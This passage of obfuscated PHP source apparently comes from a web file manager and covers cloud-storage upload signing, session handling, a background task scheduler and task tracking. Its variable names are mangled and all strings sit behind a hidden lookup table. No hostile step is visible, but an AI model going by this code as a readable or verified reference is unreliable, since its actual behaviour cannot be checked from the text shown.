$¢©†¿…¨ = hash_hmac($¨ï’Ö—ä[1363], $ìÔ¨§ó‹, $”˜ì©ÆÉ, !0); $øÂÚ¡Ü = hash_hmac($¨ï’Ö—ä[1363], $¬ß˜¬æ, $¢©†¿…¨, !0); $¹¨øëŠØ = hash_hmac($¨ï’Ö—ä[1363], $†İ§ƒ¬, $øÂÚ¡Ü); $€–úº´æ = array($¨ï’Ö—ä[215] => $¨ï’Ö—ä[12], $¨ï’Ö—ä[1365] => $¨ï’Ö—ä[12], $¨ï’Ö—ä[1321] => $ŠôêÍ³Ñ, $¨ï’Ö—ä[1325] => $İıçêÒŒ, $¨ï’Ö—ä[1329] => $†İ§ƒ¬, $¨ï’Ö—ä[1366] => $ËÏÜ ×©, $¨ï’Ö—ä[1367] => $ìë¡¦Ÿ, $¨ï’Ö—ä[1368] => $© ˜‚Ù®, $¨ï’Ö—ä[1369] => $”ì­ƒí, $¨ï’Ö—ä[1370] => $¹¨øëŠØ, $¨ï’Ö—ä[181] => $this->getHost()); return $€–úº´æ; } public function multiUploadFormData($åíˆÄµê, $È¢®ÍÎ¬ = 3600) { $ÓøÉ‘³ü =& $_SERVER[­õöî’–]; $»ªš’˜ = gmdate($ÓøÉ‘³ü[1449]); $œ¹Ş˜Æ‚ = array(); $³×ÔôŠ = $this->client->getUploadId($this->bucket, $åíˆÄµê, $œ¹Ş˜Æ‚); if (!$³×ÔôŠ) { return !1; } return array($ÓøÉ‘³ü[223] => $³×ÔôŠ, $ÓøÉ‘³ü[181] => $this->getHost() . $ÓøÉ‘³ü[8] . $this->pathEncode($åíˆÄµê), $ÓøÉ‘³ü[224] => $»ªš’˜, $ÓøÉ‘³ü[94] => $åíˆÄµê); } public function multiUploadAuthData($•ÉÉ¼±ù, $¯Ô§Òä› = array()) { $´–½æøï =& $_SERVER[­õöî’–]; $©¹öè‚ = isset($¯Ô§Òä›[$´–½æøï[174]]) ? $¯Ô§Òä›[$´–½æøï[174]] : $´–½æøï[12]; $óÌ§‰³ = $¯Ô§Òä›[$´–½æøï[94]]; unset($¯Ô§Òä›[$´–½æøï[94]]); if (isset($¯Ô§Òä›[$´–½æøï[225]])) { return $this->listUploadParts($óÌ§‰³, $¯Ô§Òä›); } $”Ìéî¡ = array(); if (isset($¯Ô§Òä›[$´–½æøï[1450]])) { $”Ìéî¡[$´–½æøï[1451]] = $¯Ô§Òä›[$´–½æøï[1450]]; } $”Üºó³Ÿ = explode($´–½æøï[183], $this->getHost()); $“Ïˆ…½á = array($´–½æøï[1452] => $”Üºó³Ÿ[1], $´–½æøï[1453] => $´–½æøï[12], $´–½æøï[215] => $´–½æøï[120], $´–½æøï[1365] => $¯Ô§Òä›[$´–½æøï[76]]); $êÆÇÎ• = $´–½æøï[228]; $¸—Ø´áÎ = $´–½æøï[8] . $this->pathEncode($óÌ§‰³) . $©¹öè‚; $ï¤‰üÇ = $this->client->__getSignatureV4($”Ìéî¡, $“Ïˆ…½á, $êÆÇÎ•, $¸—Ø´áÎ); if (strpos($©¹öè‚, $´–½æøï[227]) === 0) { if (isset($”Ìéî¡[$´–½æøï[1451]])) { $‘›ä‡“Š = $”Ìéî¡[$´–½æøï[1451]]; } else { if (isset($ï¤‰üÇ[$´–½æøï[1451]])) { $‘›ä‡“Š = $ï¤‰üÇ[$´–½æøï[1451]]; } else { $‘›ä‡“Š = hash($´–½æøï[1363], $´–½æøï[12]); } } return array($´–½æøï[234] => $ï¤‰üÇ[$´–½æøï[234]], $´–½æøï[1451] => $‘›ä‡“Š, $´–½æøï[224] => $ï¤‰üÇ[$´–½æøï[1454]]); } return $ï¤‰üÇ[$´–½æøï[234]]; } public function listUploadParts($Ó§‘´û‡, $õÁìİ÷ù = array()) { $ÊÅ·›³ =& $_SERVER[­õöî’–]; $†Ëšü¯Ó = str_replace($ÊÅ·›³[235], $ÊÅ·›³[12], $õÁìİ÷ù[$ÊÅ·›³[174]]); $¿ñİÁœİ = $this->client->listParts($this->bucket, $Ó§‘´û‡, $†Ëšü¯Ó); if (!$¿ñİÁœİ) { return !1; } $óµ§‡ı = $ÊÅ·›³[1455]; foreach ($¿ñİÁœİ as $—÷‰É’¾) { $óµ§‡ı .= $ÊÅ·›³[1456] . "\x3c\120\x61\x72\x74\x4e\165\x6d\x62\145\x72\x3e{$—÷‰É’¾[$ÊÅ·›³[1410]]}\x3c\57\120\x61\x72\x74\x4e\165\155\142\x65\162\76\xa" . "\74\105\x54\x61\x67\76{$—÷‰É’¾[$ÊÅ·›³[1411]]}\x3c\57\x45\x54\141\x67\76\12" . $ÊÅ·›³[1457]; } $óµ§‡ı .= $ÊÅ·›³[1458]; $ŒŸ–¦ = array(); $×š”ı½ = explode($ÊÅ·›³[183], $this->getHost()); $ı—ßÌÕß = array($ÊÅ·›³[1452] => $×š”ı½[1], $ÊÅ·›³[215] => $ÊÅ·›³[120], $ÊÅ·›³[1365] => strlen($óµ§‡ı)); $³Ğ³ê‡ = $ÊÅ·›³[226]; $ÁÁ½Ëğ© = $ÊÅ·›³[8] . $this->pathEncode($Ó§‘´û‡) . $õÁìİ÷ù[$ÊÅ·›³[174]]; $Àç¹çê„ = $this->client->__getSignatureV4($ŒŸ–¦, $ı—ßÌÕß, $³Ğ³ê‡, $ÁÁ½Ëğ©, $óµ§‡ı); return array($ÊÅ·›³[234] => $Àç¹çê„[$ÊÅ·›³[234]], $ÊÅ·›³[224] => $Àç¹çê„[$ÊÅ·›³[1454]], $ÊÅ·›³[236] => $¿ñİÁœİ, $ÊÅ·›³[1451] => $Àç¹çê„[$ÊÅ·›³[1451]]); } public function link($ğÔÎğÒ, $´á’¸– = array()) { return parent::link($ğÔÎğÒ, $´á’¸–); } public function fileOut($ë…¤—à, $È“±ÍğÔ = false, $Ëà£Ïø = false, $Ğ¨¤¥ˆ‚ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[­õöî’–][1459])) { return parent::fileOutServer($ë…¤—à, $È“±ÍğÔ, $Ëà£Ïø, $Ğ¨¤¥ˆ‚); } parent::fileOut($ë…¤—à, $È“±ÍğÔ, $Ëà£Ïø, $Ğ¨¤¥ˆ‚); } public function fileOutImage($Ìõ¨¨¢, $‹–‰½„û = 250) { if (strstr($this->endpoint, $_SERVER[­õöî’–][1459])) { return parent::fileOutImageServer($Ìõ¨¨¢, $‹–‰½„û); } parent::fileOutImage($Ìõ¨¨¢, $‹–‰½„û); } public function fileOutLink($³¢É×°) { $æş‘™ê’ =& $_SERVER[­õöî’–]; if (substr($³¢É×°, 0, 7) == $æş‘™ê’[1332]) { $³¢É×° = $æş‘™ê’[1333] . substr($³¢É×°, 7); } header($æş‘™ê’[161] . $³¢É×°); die; } public function getHost() { $‡ËÒûÏÙ =& $_SERVER[­õöî’–]; $õéø±Ğõ = str_rtrim(parent::getHost(), $‡ËÒûÏÙ[8] . $this->bucket); $õéø±Ğõ = explode($‡ËÒûÏÙ[183], $õéø±Ğõ); return $õéø±Ğõ[0] . $‡ËÒûÏÙ[183] . $this->bucket . $‡ËÒûÏÙ[10] . $õéø±Ğõ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ÃÖå”ß¡, $ó¤ÅŞ™œ = 0) { parent::__construct(); $this->source = $ÃÖå”ß¡; $this->sourceSize = $ó¤ÅŞ™œ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ë€çÆ¬¦ = false) { return $this->sourceSize; } public function getContent($şŸØÕŸ = false) { return $this->fileSubstr($şŸØÕŸ, 0, $this->sourceSize); } public function fileSubstr($÷Ìò±ç¸ = false, $ì•¤· Ä = 0, $şÊËúÇñ = 0) { if (!$şÊËúÇñ) { $şÊËúÇñ = $this->sourceSize; } $Óö‚„Ç— = $this->sourceSize - $ì•¤· Ä; if ($şÊËúÇñ >= $Óö‚„Ç—) { $şÊËúÇñ = $Óö‚„Ç—; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ì•¤· Ä, $şÊËúÇñ); } if ($this->sourceType == self::TYPE_FILE) { if ($şÊËúÇñ <= 0) { return $_SERVER[­õöî’–][12]; } $èªÍ´¢Ô = ftell($this->source); fseek_64($this->source, $èªÍ´¢Ô + $ì•¤· Ä); $°ÁĞÍµë = @fread($this->source, $şÊËúÇñ); fseek_64($this->source, $èªÍ´¢Ô); return $°ÁĞÍµë; } } public function hashMd5($€¢¢”Ùû = false) { return md5($this->getContent()); } public static function hash($†›öÅËÍ, $ëÉò¾Ø  = 0) { $„«æêß¯ = new PathDriverStream($†›öÅËÍ, $ëÉò¾Ø ); return $„«æêß¯->hashSimple($†›öÅËÍ); } public static function md5($ĞóÚ†Šø, $ğá£­¢å = 0) { $ë£Àöºê = new PathDriverStream($ĞóÚ†Šø, $ğá£­¢å); return $ë£Àöºê->hashMd5($ĞóÚ†Šø); } } goto C‰Ì•‹§É®; eêÂ‹ƒ‹õ: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ú«Ïí±™ =& $_SERVER[­õöî’–]; static $—¹Ş±Í = false; if ($—¹Ş±Í) { return $—¹Ş±Í; } $¬Í“ó´’ = $GLOBALS[$Ú«Ïí±™[6]][$Ú«Ïí±™[349]]; self::$sessionTime = $¬Í“ó´’[$Ú«Ïí±™[1615]]; $öü’‰£Ÿ = isset($GLOBALS[$Ú«Ïí±™[1616]]) ? $GLOBALS[$Ú«Ïí±™[1616]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($öü’‰£Ÿ)) { self::$sessionSign = Cookie::get($öü’‰£Ÿ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($öü’‰£Ÿ, self::$sessionSign, self::$sessionTime); $¶Ëğ ğ³ = $¬Í“ó´’[$Ú«Ïí±™[1617]]; $¼¥Æøñƒ = $¬Í“ó´’[$¶Ëğ ğ³]; $‹÷›†’€ = $¬Í“ó´’[$Ú«Ïí±™[819]]; switch ($¶Ëğ ğ³) { case $Ú«Ïí±™[21]: self::$handle = Model($Ú«Ïí±™[820]); break; case $Ú«Ïí±™[821]: self::$handle = new CacheRedis($¼¥Æøñƒ, $‹÷›†’€); break; case $Ú«Ïí±™[822]: self::$handle = new CacheMemcached($¼¥Æøñƒ, $‹÷›†’€); break; case $Ú«Ïí±™[199]: $¼¥Æøñƒ[$Ú«Ïí±™[84]] = $¼¥Æøñƒ[$Ú«Ïí±™[84]] . $Ú«Ïí±™[1618]; self::$handle = new CacheFile($¼¥Æøñƒ, $‹÷›†’€); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $—¹Ş±Í = new self(); return $—¹Ş±Í; } public static function getBySign($ğìœë¡á) { $½ëå¹¡£ = self::$handle->get($ğìœë¡á); $½ëå¹¡£ = unserialize($½ëå¹¡£); return is_array($½ëå¹¡£) ? $½ëå¹¡£ : array(); } public static function setBySign($¼ÚûÅ×Ô, $°á·Î²) { CacheLock::lock($¼ÚûÅ×Ô); self::$handle->set($¼ÚûÅ×Ô, serialize($°á·Î²), self::$sessionTime); CacheLock::unlock($¼ÚûÅ×Ô); } public static function sign($ ¶Ğşå‚ = false) { $ ¶Ğşå‚ && (self::$sessionSign = $ ¶Ğşå‚); self::init(); return self::$sessionSign; } public static function set($Î·ÕÜñ, $ÌÀ¥ì“ = false) { self::init(); if (is_array($Î·ÕÜñ)) { foreach ($Î·ÕÜñ as $ÁÖ×Ô¾º => $¢‰İ­¥Ÿ) { array_set_value(self::$data, $ÁÖ×Ô¾º, $¢‰İ­¥Ÿ); } } else { array_set_value(self::$data, $Î·ÕÜñ, $ÌÀ¥ì“); } self::setBySign(self::$sessionSign, self::$data); } public static function get($Ç¸¬À©µ = false) { self::init(); if (!$Ç¸¬À©µ) { return self::$data; } return array_get_value(self::$data, $Ç¸¬À©µ); } public static function remove($‰Ê¶şâ–) { self::init(); unset(self::$data[$‰Ê¶şâ–]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[­õöî’–][824])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ä‚ó¤ˆ¯ =& $_SERVER[­õöî’–]; if (self::valueGet($Ä‚ó¤ˆ¯[741]) != $Ä‚ó¤ˆ¯[88]) { return; } if (self::valueGet($Ä‚ó¤ˆ¯[1619]) == $Ä‚ó¤ˆ¯[88]) { $Ù†Ãá”÷ = self::valueGet($Ä‚ó¤ˆ¯[1620]); if (time() - $Ù†Ãá”÷ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$Ä‚ó¤ˆ¯[1621]] = 1; self::valueSet($Ä‚ó¤ˆ¯[1619], $Ä‚ó¤ˆ¯[88]); self::log($Ä‚ó¤ˆ¯[1622] . ACTION . $Ä‚ó¤ˆ¯[1623]); Session::$data = array(); Session::$sessionSign = $Ä‚ó¤ˆ¯[12]; $GLOBALS[$Ä‚ó¤ˆ¯[503]] = 1; Hook::bind($Ä‚ó¤ˆ¯[1624], $Ä‚ó¤ˆ¯[1625]); $ÁÉäü‡– = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ä‚ó¤ˆ¯[741]) != $Ä‚ó¤ˆ¯[88]) { self::valueSet($Ä‚ó¤ˆ¯[1619], $Ä‚ó¤ˆ¯[197]); self::log($Ä‚ó¤ˆ¯[1626]); die; } $£«²Ë¡„ = time(); if ($£«²Ë¡„ - $ÁÉäü‡– >= 60) { self::valueSet(array($Ä‚ó¤ˆ¯[1619] => $Ä‚ó¤ˆ¯[88], $Ä‚ó¤ˆ¯[1620] => $£«²Ë¡„), !1); $ÁÉäü‡– = $£«²Ë¡„; } if (!file_exists(USER_SYSTEM . $Ä‚ó¤ˆ¯[1627])) { self::valueSet(array($Ä‚ó¤ˆ¯[1619] => $Ä‚ó¤ˆ¯[197], $Ä‚ó¤ˆ¯[741] => $Ä‚ó¤ˆ¯[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $¼ß¨Ùš =& $_SERVER[­õöî’–]; http_close(); self::valueSet($¼ß¨Ùš[741], $¼ß¨Ùš[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($¼ß¨Ùš[1619] => $¼ß¨Ùš[197], $¼ß¨Ùš[741] => $¼ß¨Ùš[88]), !1); } public static function taskSwitch() { $“İÍ´’½ =& $_SERVER[­õöî’–]; $£”©—à¯ = self::valueGet($“İÍ´’½[741]) == $“İÍ´’½[88] ? $“İÍ´’½[197] : $“İÍ´’½[88]; self::valueSet($“İÍ´’½[741], $£”©—à¯); } public static function shutdownEvent() { $›Î’œÃ† =& $_SERVER[­õöî’–]; self::valueSet($›Î’œÃ†[1619], $›Î’œÃ†[197]); self::log($›Î’œÃ†[1628]); } public static function config($­€Œî¯Í, $³Àè¤•) { self::valueSet($_SERVER[­õöî’–][741], $­€Œî¯Í); } private static function taskRunAll() { $ÛºµÏçù =& $_SERVER[­õöî’–]; $îÆÙÁÛÈ = timeFloat(); $¤õ˜öùÔ = Model($ÛºµÏçù[1629])->listData(); $ğçáàœ = count($¤õ˜öùÔ); for ($â¬”Óó = 0; $â¬”Óó < $ğçáàœ; $â¬”Óó++) { $¦Îç·‘ = $¤õ˜öùÔ[$â¬”Óó]; if (!$¦Îç·‘[$ÛºµÏçù[399]] || $¦Îç·‘[$ÛºµÏçù[1630]] != $ÛºµÏçù[88]) { continue; } if (!self::taskTimeCheck($¦Îç·‘)) { continue; } self::taskRun($¦Îç·‘); } Hook::trigger($ÛºµÏçù[1631]); self::taskQueueRun($îÆÙÁÛÈ); } private static function taskQueueRun($–‰•â) { $ÑåÉåÅâ = 10; while (!0) { $ºâ¨ŠÙ  = TaskQueue::run(); if ($ºâ¨ŠÙ  === !1) { break; } if (timeFloat() - $–‰•â >= $ÑåÉåÅâ) { break; } } } private static function taskTimeCheck($ÉüÀô) { $œ¨‡ÙÆ =& $_SERVER[­õöî’–]; $¯ˆë¬›µ = json_decode($ÉüÀô[$œ¨‡ÙÆ[203]], !0); $à–û÷¨ = intval($ÉüÀô[$œ¨‡ÙÆ[1620]]); $¦¯ğÛèò = strtotime($œ¨‡ÙÆ[1632] . $¯ˆë¬›µ[$œ¨‡ÙÆ[1633]] . $œ¨‡ÙÆ[1634]) - strtotime($œ¨‡ÙÆ[1635]); $§Á“§í = time() - strtotime(date($œ¨‡ÙÆ[1636]) . $œ¨‡ÙÆ[1637]); $©¡¶á¶ç = $§Á“§í >= $¦¯ğÛèò && $§Á“§í <= $¦¯ğÛèò + 3600; switch ($¯ˆë¬›µ[$œ¨‡ÙÆ[33]]) { case $œ¨‡ÙÆ[1638]: if (time() - $à–û÷¨ < 3600 * 24 * 30) { return !1; } if ($¯ˆë¬›µ[$œ¨‡ÙÆ[1638]] == date($œ¨‡ÙÆ[1639]) && $©¡¶á¶ç) { return !0; } break; case $œ¨‡ÙÆ[1640]: if (time() - $à–û÷¨ < 3600 * 24 * 7) { return !1; } $¢½ˆ¹ = date($œ¨‡ÙÆ[1641]) == 0 ? 7 : date($œ¨‡ÙÆ[1641]); if ($¯ˆë¬›µ[$œ¨‡ÙÆ[1640]] == $¢½ˆ¹ && $©¡¶á¶ç) { return !0; } break; case $œ¨‡ÙÆ[1633]: if (time() - $à–û÷¨ < 3600 * 24) { return !1; } if ($©¡¶á¶ç) { return !0; } break; case $œ¨‡ÙÆ[1642]: if (time() - $à–û÷¨ >= floatval($¯ˆë¬›µ[$œ¨‡ÙÆ[1642]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $°Ãş—Ö =& $_SERVER[­õöî’–]; static $º”¬¶ÜŒ = 0; $Óâ¦ò§˜ = 300; if (!$º”¬¶ÜŒ) { $º”¬¶ÜŒ = time(); } if (time() - $º”¬¶ÜŒ < $Óâ¦ò§˜) { return; } $º”¬¶ÜŒ = time(); $Íüú—¦¨ = Model($°Ãş—Ö[513])->db($°Ãş—Ö[12]); if ($Íüú—¦¨) { $Íüú—¦¨->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($°Ãş—Ö[1643], $°Ãş—Ö[1644]); die; } } public static function taskRun($Òõ™õä) { $ş ¯µıÍ =& $_SERVER[­õöî’–]; self::log($ş ¯µıÍ[1645] . $Òõ™õä[$ş ¯µıÍ[399]] . $ş ¯µıÍ[1646] . $Òõ™õä[$ş ¯µıÍ[32]] . $ş ¯µıÍ[1647] . $Òõ™õä[$ş ¯µıÍ[1648]]); Model($ş ¯µıÍ[1629])->run($Òõ™õä[$ş ¯µıÍ[399]]); $¤²ˆÀ‡Â = timeFloat(); $àûãº·å = $ş ¯µıÍ[12]; switch ($Òõ™õä[$ş ¯µıÍ[33]]) { case $ş ¯µıÍ[307]: $ßüÖ¾Ü‡ = url_request($Òõ™õä[$ş ¯µıÍ[1648]], $ş ¯µıÍ[230], !1, !1, !1, !1, 10); if ($ßüÖ¾Ü‡[$ş ¯µıÍ[741]]) { $àûãº·å = strlen($ßüÖ¾Ü‡[$ş ¯µıÍ[1201]]); } break; case $ş ¯µıÍ[229]: $àûãº·å = Hook::apply($Òõ™õä[$ş ¯µıÍ[1648]]); default: break; } Model($ş ¯µıÍ[1649])->add(array($ş ¯µıÍ[1650] => $ş ¯µıÍ[12], $ş ¯µıÍ[1651] => $ş ¯µıÍ[197], $ş ¯µıÍ[33] => $ş ¯µıÍ[1652] . $Òõ™õä[$ş ¯µıÍ[399]], $ş ¯µıÍ[1653] => json_encode(array($ş ¯µıÍ[32] => $Òõ™õä[$ş ¯µıÍ[32]], $ş ¯µıÍ[1654] => timeFloat() - $¤²ˆÀ‡Â, $ş ¯µıÍ[293] => $àûãº·å)))); $ÆâÌ ë  = $àûãº·å ? $ş ¯µıÍ[1655] . $àûãº·å : $ş ¯µıÍ[12]; self::log($ş ¯µıÍ[1656] . $Òõ™õä[$ş ¯µıÍ[399]] . $ş ¯µıÍ[164] . $ÆâÌ ë ); return !0; } private static function valueGet($†Æö÷£ä) { $ù†ìÂŒ =& $_SERVER[­õöî’–]; $Şßş ˜¯ = $ù†ìÂŒ[1657]; $Šà ºÁç = Model($ù†ìÂŒ[435])->get($†Æö÷£ä, $Şßş ˜¯); if (is_null($Šà ºÁç)) { Model($ù†ìÂŒ[435])->set($ù†ìÂŒ[741], $ù†ìÂŒ[88], $Şßş ˜¯); Model($ù†ìÂŒ[435])->set($ù†ìÂŒ[1619], $ù†ìÂŒ[197], $Şßş ˜¯); $Šà ºÁç = Model($ù†ìÂŒ[435])->get($†Æö÷£ä, $Şßş ˜¯); } return $Šà ºÁç; } private static function valueSet($ıÊœÛÀ®, $í¤Ôªì÷) { $å®†‘ª¤ =& $_SERVER[­õöî’–]; $èóôØé° = $å®†‘ª¤[1658]; CacheLock::lock($èóôØé°); $É‹Ş–™Ã = Model($å®†‘ª¤[435])->set($ıÊœÛÀ®, $í¤Ôªì÷, $å®†‘ª¤[1657]); CacheLock::unlock($èóôØé°); return $É‹Ş–™Ã; } protected static function log($î¸Óêòü) { write_log($î¸Óêòü, $_SERVER[­õöî’–][1644]); } private static function cacheClear() { $ÔöµÔüÑ =& $_SERVER[­õöî’–]; Cache::clearMemory(Model($ÔöµÔüÑ[435])->cacheKey($ÔöµÔüÑ[1657])); Cache::clearMemory(Model($ÔöµÔüÑ[435])->cacheKey($ÔöµÔüÑ[1659])); Model($ÔöµÔüÑ[1629])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\x73\x74\157\160"; const STATYS_RUNNING = "\x72\x75\156\x6e\151\x6e\147"; const STATYS_KILL = "\x6b\151\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Ø¨ Æ, $òúéÛáæ = '', $œ¸ÛÆàª = 0, $Ü¶£Š¥– = '') { $¹Úö»‡İ =& $_SERVER[­õöî’–]; if (self::get($Ø¨ Æ)) { return; } $ÀêœÌïø = defined($¹Úö»‡İ[475]) ? USER_ID : $¹Úö»‡İ[197]; $this->task = array($¹Úö»‡İ[399] => $Ø¨ Æ, $¹Úö»‡İ[1660] => $ÀêœÌïø, $¹Úö»‡İ[1560] => $Ü¶£Š¥–, $¹Úö»‡İ[453] => $¹Úö»‡İ[12], $¹Úö»‡İ[33] => $òúéÛáæ, $¹Úö»‡İ[1062] => $¹Úö»‡İ[12], $¹Úö»‡İ[777] => $œ¸ÛÆàª, $¹Úö»‡İ[1661] => 0, $¹Úö»‡İ[1662] => 0, $¹Úö»‡İ[1663] => 0, $¹Úö»‡İ[1664] => timeFloat(), $¹Úö»‡İ[1665] => 0, $¹Úö»‡İ[1666] => 0, $¹Úö»‡İ[1667] => 0, $¹Úö»‡İ[1668] => 0, $¹Úö»‡İ[741] => $¹Úö»‡İ[1619]); $GLOBALS[$¹Úö»‡İ[1669]] = 1; Hook::bind($¹Úö»‡İ[1624], array($this, $¹Úö»‡İ[1670])); Hook::bind($¹Úö»‡İ[1671], array($this, $¹Úö»‡İ[1672])); $this->startAfter(); Hook::trigger($¹Úö»‡İ[1673], $this->task); $this->task[$¹Úö»‡İ[1666]] = timeFloat(); } public function end($ùÜ»àÜø = '') { $Ñ·ùƒİ =& $_SERVER[­õöî’–]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Ñ·ùƒİ[1666]]) { self::valueSet($this->task[$Ñ·ùƒİ[399]], !1); } $this->isEnd = !0; if ($ùÜ»àÜø) { $this->task[$Ñ·ùƒİ[453]] = $ùÜ»àÜø; } self::log($Ñ·ùƒİ[1674] . $this->task[$Ñ·ùƒİ[399]] . $Ñ·ùƒİ[1675] . sprintf($Ñ·ùƒİ[841], timeFloat() - $this->task[$Ñ·ùƒİ[1664]]) . $Ñ·ùƒİ[1676]); Hook::unbind($Ñ·ùƒİ[1624], array($this, $Ñ·ùƒİ[1670])); Hook::unbind($Ñ·ùƒİ[1671], array($this, $Ñ·ùƒİ[1672])); $this->endAfter(); $é–˜–Œš = $this->task; $this->task = !1; Hook::trigger($Ñ·ùƒİ[1677], $é–˜–Œš); } public function update($¾£ïú» = 0, $ëèíïó™ = false) { $§—ı§îÏ =& $_SERVER[­õöî’–]; $Œà¶¼ç© =& $this->task; if (!$Œà¶¼ç©) { return; } $Œà¶¼ç©[$§—ı§îÏ[1661]] += $¾£ïú»; $Œà¶¼ç©[$§—ı§îÏ[1665]] = timeFloat(); if ($Œà¶¼ç©[$§—ı§îÏ[777]]) { if ($Œà¶¼ç©[$§—ı§îÏ[777]] < $Œà¶¼ç©[$§—ı§îÏ[1661]]) { $Œà¶¼ç©[$§—ı§îÏ[777]] = $Œà¶¼ç©[$§—ı§îÏ[1661]]; } $€×ÏÊ© = timeFloat() - $Œà¶¼ç©[$§—ı§îÏ[1664]] - $Œà¶¼ç©[$§—ı§îÏ[1667]]; if ($€×ÏÊ© <= 0) { $€×ÏÊ© = 0.001; } $Œà¶¼ç©[$§—ı§îÏ[1662]] = $Œà¶¼ç©[$§—ı§îÏ[1661]] / $Œà¶¼ç©[$§—ı§îÏ[777]]; $Œà¶¼ç©[$§—ı§îÏ[1663]] = $Œà¶¼ç©[$§—ı§îÏ[1661]] / $€×ÏÊ©; if ($Œà¶¼ç©[$§—ı§îÏ[1662]] > 0) { $Œà¶¼ç©[$§—ı§îÏ[1668]] = $€×ÏÊ© * (1 - $Œà¶¼ç©[$§—ı§îÏ[1662]]) / $Œà¶¼ç©[$§—ı§îÏ[1662]]; } $Œà¶¼ç©[$§—ı§îÏ[1668]] = $Œà¶¼ç©[$§—ı§îÏ[1668]] <= 0 ? 0 : $Œà¶¼ç©[$§—ı§îÏ[1668]]; } $this->updateAfter(); $µ¨ƒÒìá = 0.2; if (timeFloat() - $Œà¶¼ç©[$§—ı§îÏ[1666]] < $µ¨ƒÒìá && !$ëèíïó™) { return; } $ƒû±˜”ß = self::get($Œà¶¼ç©[$§—ı§îÏ[399]]); $ç¤õ™æ§ = $ƒû±˜”ß[$§—ı§îÏ[741]]; if ($ç¤õ™æ§ == self::STATYS_KILL) { $Çá¾ÄÕ© = array($§—ı§îÏ[1678] => LNG($§—ı§îÏ[1679]), $§—ı§îÏ[1211] => !1); Cache::set($§—ı§îÏ[1680] . $this->task[$§—ı§îÏ[399]], $Çá¾ÄÕ©, 30); $this->onKill(); $this->end(); die; } else { if ($ç¤õ™æ§ == self::STATYS_STOP) { $Êİ®úšü = 2; $ƒû±˜”ß[$§—ı§îÏ[1667]] += $Êİ®úšü; self::valueSet($Œà¶¼ç©[$§—ı§îÏ[399]], $ƒû±˜”ß); sleep($Êİ®úšü); $this->update(); return; } } $Œà¶¼ç©[$§—ı§îÏ[741]] = $ç¤õ™æ§ ? $ç¤õ™æ§ : $Œà¶¼ç©[$§—ı§îÏ[741]]; $Œà¶¼ç©[$§—ı§îÏ[1667]] = $ƒû±˜”ß[$§—ı§îÏ[1667]] ? $ƒû±˜”ß[$§—ı§îÏ[1667]] : 0; $Œà¶¼ç©[$§—ı§îÏ[1666]] = timeFloat(); Hook::trigger($§—ı§îÏ[1681], $Œà¶¼ç©); self::valueSet($Œà¶¼ç©[$§—ı§îÏ[399]], $Œà¶¼ç©); } public function onKillSet($¬‘³şĞñ, $Á¬ÑØËª = array()) { $this->onKillCall = array($¬‘³şĞñ, $Á¬ÑØËª); } public function onKill() { $ĞæøË› =& $_SERVER[­õöî’–]; self::log($ĞæøË›[1674] . $this->task[$ĞæøË›[399]] . $ĞæøË›[1682]); Hook::trigger($ĞæøË›[1683], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($”†€¶°‘) { $Å™œŸ²£ =& $_SERVER[­õöî’–]; Cache::set($Å™œŸ²£[1680] . $this->task[$Å™œŸ²£[399]], $”†€¶°‘, 60); return $”†€¶°‘; } public static function get($ŠôĞâ¯Ú) { $ò¶¬ïå« =& $_SERVER[­õöî’–]; $ÌîÖÉš = self::valueGet($ŠôĞâ¯Ú); if (is_array($ÌîÖÉš) && $ÌîÖÉš[$ò¶¬ïå«[1684]]) { $´Í±Ñ­ = ActionApply($ÌîÖÉš[$ò¶¬ïå«[1684]], array($ÌîÖÉš)); $ÌîÖÉš = is_array($´Í±Ñ­) ? $´Í±Ñ­ : $ÌîÖÉš; } return $ÌîÖÉš; } public static function listData() { $Ùâ¹®µ = self::valueGet(); return array_sort_by($Ùâ¹®µ, $_SERVER[­õöî’–][1664], !0); } public static function kill($Èå¤ö) { return self::changeStatus($Èå¤ö, self::STATYS_KILL); } public static function stop($úÁå„) { return self::changeStatus($úÁå„, self::STATYS_STOP); } public static function restart($§öùÓÕ¿) { return self::changeStatus($§öùÓÕ¿, self::STATYS_RUNNING); } public static function killAll() { $…Î©²Šú =& $_SERVER[­õöî’–]; $å¯õ—ìÍ = self::listData(); foreach ($å¯õ—ìÍ as $Ã€ûĞôğ) { self::kill($Ã€ûĞôğ[$…Î©²Šú[399]]); } sleep(2); foreach ($å¯õ—ìÍ as $Ã€ûĞôğ) { self::valueSet($Ã€ûĞôğ[$…Î©²Šú[399]], !1); } } private static function changeStatus($šÌâ ù¶, $ÑÃ‚ïÌ) { $…Á½†ó =& $_SERVER[­õöî’–]; $ÄÊ“¶‚ = self::valueGet($šÌâ ù¶); if (!$ÄÊ“¶‚) { return !1; } 